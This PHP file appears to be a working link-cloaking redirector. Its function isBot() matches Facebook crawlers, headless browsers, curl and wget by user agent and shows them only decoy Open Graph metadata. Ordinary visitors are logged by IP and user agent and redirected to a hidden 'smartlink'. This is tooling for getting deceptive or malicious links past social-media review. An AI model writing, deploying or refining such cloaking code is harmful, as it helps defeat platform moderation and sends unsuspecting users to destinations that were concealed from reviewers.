<?php
require_once 'mobile_protection.php';

session_start();

$token = $_GET['token'] ?? '';

if (!$token) {
    http_response_code(404);
    echo 'Invalid link';
    exit;
}

$links = json_decode(file_get_contents(__DIR__ . '/links.json'), true) ?? [];
$linkData = null;
foreach ($links as $link) {
    if ($link['token'] === $token) {
        $linkData = $link;
        break;
    }
}

if (!$linkData) {
    http_response_code(404);
    echo 'Link not found';
    exit;
}

function isBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $botSignatures = [
        'facebookexternalhit', 'Facebot', 'Facebook', 'FB_IAB', 'FBAN/', 'FBAV/', 'FBDV/', 'FBMD/',
        'bot', 'spider', 'crawler', 'headless', 'phantomjs', 'selenium', 'curl', 'wget'
    ];

    foreach ($botSignatures as $sig) {
        if (stripos($userAgent, $sig) !== false) {
            return true;
        }
    }

    if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_ACCEPT'])) {
        return true;
    }

    return false;
}

function isRateLimited($ip) {
    $limit = 5;
    $timeWindow = 60;
    $logFile = __DIR__ . '/rate_limit.log';

    if (!file_exists($logFile)) {
        file_put_contents($logFile, '');
    }

    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $now = time();
    $recentClicks = 0;
    $newLines = [];

    foreach ($lines as $line) {
        list($timestamp, $loggedIp) = explode(',', $line);
        if ($now - (int)$timestamp < $timeWindow) {
            $newLines[] = $line;
            if ($loggedIp === $ip) {
                $recentClicks++;
            }
        }
    }

    if ($recentClicks >= $limit) {
        return true;
    }

    $newLines[] = $now . ',' . $ip;
    file_put_contents($logFile, implode("\n", $newLines) . "\n");

    return false;
}

if (isBot()) {
    header('Content-Type: text/html; charset=utf-8');
    $title = htmlspecialchars($linkData['og']['title'] ?? '');
    $description = htmlspecialchars($linkData['og']['description'] ?? '');
    $image = htmlspecialchars($linkData['og']['image'] ?? '');
    $url = htmlspecialchars('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    $fbAppId = '1604020986967005';
    echo "<!DOCTYPE html><html><head><title>{$title}</title><meta property='fb:app_id' content='{$fbAppId}'/><meta property='og:title' content='{$title}'/><meta property='og:description' content='{$description}'/><meta property='og:image' content='{$image}'/><meta property='og:image:width' content='1200'/><meta property='og:image:height' content='630'/><meta property='og:url' content='{$url}'/><meta property='og:type' content='website'/></head><body><div style='display:none;'>{$description}</div></body></html>";
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '';
if (isRateLimited($ip)) {
    http_response_code(429);
    echo 'Too many requests. Please try again later.';
    exit;
}

$protection = new AdvancedMobileProtection();
$finalUrl = $protection->process($linkData['smartlink']);

$clicks = json_decode(file_get_contents(__DIR__ . '/clicks.json'), true) ?? [];
$clicks[] = [
    'token' => $token,
    'timestamp' => time(),
    'ip' => $ip,
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referrer' => $_SERVER['HTTP_REFERER'] ?? ''
];
file_put_contents(__DIR__ . '/clicks.json', json_encode($clicks, JSON_PRETTY_PRINT));

header('Location: ' . $finalUrl);
exit;
?>
